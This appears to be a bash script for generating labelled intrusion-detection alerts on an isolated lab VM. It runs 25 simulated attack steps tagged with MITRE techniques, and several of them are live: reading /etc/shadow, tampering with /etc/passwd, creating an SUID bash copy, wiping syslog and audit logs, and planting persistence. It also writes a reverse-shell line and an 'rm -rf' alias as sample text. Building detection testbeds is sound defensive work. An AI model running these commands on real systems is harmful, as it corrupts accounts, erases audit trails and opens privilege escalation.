#!/bin/bash
# =====================================================================
# ATTACK SIMULATION SCRIPT — CONTROLLED LAB USE ONLY
# Part of NICS project G1140705 sub-project 4 (IDS -> CTI Kill-Chain).
# Purpose: generate labelled IDS/HIDS alerts on an ISOLATED testbed VM.
# Network addresses and credentials are placeholders (<TARGET_IP>,
# <ATTACKER_IP>, <TARGET_PASSWORD>) — set them for your own lab.
# Destructive artefacts have been neutralised; lines marked NEUTRALIZED
# show what the original simulation wrote. Do NOT run outside a
# disposable virtual machine.
# =====================================================================


# Create a timestamped log file
LOG_FILE="/tmp/attack_simulation_$(date +'%Y%m%d_%H%M%S').log"

log_action() {
    echo "$(date +'%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

log_action "▶ Starting 25 HIDS attack simulations"

### 1. Add user (T1078)
log_action "➤ Adding user 'attacker01'"
sudo useradd attacker01

### 2. Delete user
log_action "➤ Deleting user 'attacker01'"
sudo userdel attacker01

### 3. Access /etc/shadow (T1003.008)
log_action "➤ Accessing /etc/shadow"
sudo cat /etc/shadow > /dev/null

### 4. Modify /etc/passwd
log_action "➤ Modifying /etc/passwd"
echo "injected" | sudo tee -a /etc/passwd > /dev/null

### 5. Create a .tar.gz archive (T1560.001)
log_action "➤ Archiving /etc/passwd into /tmp/passwd_backup.tar.gz"
sudo tar -czf /tmp/passwd_backup.tar.gz /etc/passwd

### 6. Drop base64 file (T1027)
log_action "➤ Writing obfuscated base64 payload"
echo "SGFja2VkIQ==" | sudo tee /tmp/base64_payload.txt > /dev/null

### 7. Run suspicious chmod (T1222)
log_action "➤ Running chmod 777 on sensitive file"
sudo chmod 777 /etc/passwd

### 8. Start/stop a system service (T1543.003)
log_action "➤ Stopping cron service"
sudo systemctl stop cron

log_action "➤ Starting cron service"
sudo systemctl start cron

### 9. Drop a fake binary (T1204)
log_action "➤ Creating suspicious .sh file"
echo "echo PWNED" | sudo tee /tmp/payload.sh > /dev/null
sudo chmod +x /tmp/payload.sh

### 10. Execute the fake script
log_action "➤ Executing /tmp/payload.sh"
sudo /tmp/payload.sh

### 11. Delete log file (T1070.002)
log_action "➤ Attempting to clear syslog"
sudo bash -c "> /var/log/syslog"

### 12. Add cronjob (T1053.003)
log_action "➤ Creating malicious cronjob"
echo "* * * * * root echo hacked > /tmp/hacked.txt" | sudo tee /etc/cron.d/malicious_cron > /dev/null

### 13. Create .service file
log_action "➤ Creating suspicious systemd service"
echo -e "[Unit]\nDescription=Malicious Service\n[Service]\nExecStart=/bin/echo Hello\n[Install]\nWantedBy=multi-user.target" | sudo tee /etc/systemd/system/malicious.service > /dev/null

### 14. Try changing hostname (T1112)
log_action "➤ Changing hostname"
sudo hostname hacked-host

### 15. Create hidden file
log_action "➤ Creating hidden file"
sudo touch /tmp/.hiddenfile

### 16. Create SUID binary clone
log_action "➤ Cloning /bin/bash to SUID /tmp/suidbash"
sudo cp /bin/bash /tmp/suidbash
sudo chmod u+s /tmp/suidbash

### 17. Add SSH key (T1098.004)
log_action "➤ Adding fake SSH key"
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> ~/.ssh/authorized_keys

### 18. Modify bashrc
log_action "➤ Adding malicious alias to .bashrc"
echo "alias ls='rm -rf *'" >> /tmp/bashrc_tamper.sample   # NEUTRALIZED: was ~/.bashrc

### 19. Simulate port scan (just log it)
log_action "➤ Simulating nmap scan locally"
nmap -sS 127.0.0.1 > /dev/null

### 20. Write to /tmp/eicar.com (EICAR test)
log_action "➤ Dropping EICAR test file"
echo 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee /tmp/eicar.com > /dev/null

### 21. Load kernel module (simulation)
log_action "➤ Simulating kernel module load (dry)"
sudo modprobe -n dummy

### 22. Change user password
log_action "➤ Changing root password (simulation)"
echo '[SIM] would run: echo root:newpass | sudo chpasswd (root password change)'   # NEUTRALIZED: did not change root password

### 23. Touch known malware filename
log_action "➤ Creating known malware filename /tmp/malware.exe"
sudo touch /tmp/malware.exe

### 24. Try reverse shell simulation (non-functional)
log_action "➤ Writing reverse shell string (non-functional)"
echo "bash -i >& /dev/tcp/attacker/1234 0>&1" | sudo tee /tmp/reverse.sh > /dev/null

### 25. Tamper audit logs
log_action "➤ Attempting to clear audit logs"
sudo bash -c "> /var/log/audit/audit.log"

log_action "✅ All attack simulations completed!"
echo "✅ Attack simulation completed. Check: $LOG_FILE"
